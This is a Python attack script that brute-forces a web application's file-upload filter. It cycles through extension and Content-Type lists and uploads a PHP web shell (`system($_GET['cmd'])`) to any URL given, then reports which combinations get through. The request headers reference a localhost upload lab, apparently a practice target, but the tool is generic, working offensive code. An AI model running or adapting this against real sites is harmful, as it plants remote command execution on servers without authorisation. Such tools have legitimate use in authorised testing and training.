#!/usr/bin/python3
import requests
import argparse
import sys
from validateParams import *
import os.path

class HandleRequest:
    def __init__(self):
        pass

    def check_magicNumbers(self,file_name):
        pass

    def check_file(self,file):
        if os.path.exists(file):
            with open(file, "r") as f:
                content = f.read()
                return content.split()            
        sys.exit(1)

    def check_extension(self,url,file_extensions,file_contentType):
        
        extensions = self.check_file(file_extensions)
        contentType = self.check_file(file_contentType) 
        
        right_extensions = [] 
        right_contentType = []
        result = {}
        
        data_params = {"Extensions":extensions,"Content-Type":contentType}
        
        for ext in data_params["Extensions"]:
            filename="000{}".format(ext)
            for ctp in data_params["Content-Type"]:
                content_type=ctp
                data ="------WebKitFormBoundary0g6SFvFBKZYQTyLH\r\nContent-Disposition: form-data; name=\"fileToUpload\"; filename=\"{}\"\r\nContent-Type: {}\r\n\r\n<?php system($_GET['cmd']); ?>\r\n------WebKitFormBoundary0g6SFvFBKZYQTyLH\r\nContent-Disposition: form-data; name=\"submit\"\r\n\r\nUpload\r\n------WebKitFormBoundary0g6SFvFBKZYQTyLH--\r\n".format(filename,content_type)
                response = self.request(url,data)
                print(response)
                if response:
                    right_extensions.append(ext)
                    right_contentType.append(content_type)
                    break
        print(right_contentType)
        right_extensions = ",".join(str(exts) for exts in right_extensions)
        print("Allow extensions : ", right_extensions)

    def request(self,url,data,username=None,password=None,cookies=None):
        
        # check url is valid
        if not isinstance(url, str):
            sys.exit(1)

        session = requests.Session()
        error = "File uploaded successfully."
        headers = {"Cache-Control": "max-age=0", "sec-ch-ua": "\"Not-A.Brand\";v=\"99\", \"Chromium\";v=\"124\"", "sec-ch-ua-mobile": "?0", "sec-ch-ua-platform": "\"Linux\"", "Upgrade-Insecure-Requests": "1", "Origin": "http://localhost:9001", "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundary0g6SFvFBKZYQTyLH", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.118 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1", "Sec-Fetch-Dest": "document", "Referer": "http://localhost:9001/upload31/index.php", "Accept-Encoding": "gzip, deflate, br", "Accept-Language": "en-US,en;q=0.9", "Connection": "close"}
        if username and password:
            session.auth(user,password)

        response = session.post(url,headers=headers,data=data,cookies=cookies)
        if error in response.text:
            return True
        return False

    def verify_url(self):
        pass


if __name__ == "__main__":
    def main():
        handle = HandleRequest()
        parser = argparse.ArgumentParser(description='Prgram test extension file allowing',usage="-u | -chk",exit_on_error=False)
        parser.add_argument('-u', action=ValidateUrl, dest='url', required=True, help="Enter url : http - https://domain.com")
        parser.add_argument('-chk', dest='chk', required=True, help='Param to check the extension allow')
        parser.add_argument('-mt', dest='mt', required=True, help='Param check the MIME Types')

        args = parser.parse_args()
        handle.check_extension(args.url,args.chk,args.mt)
    main()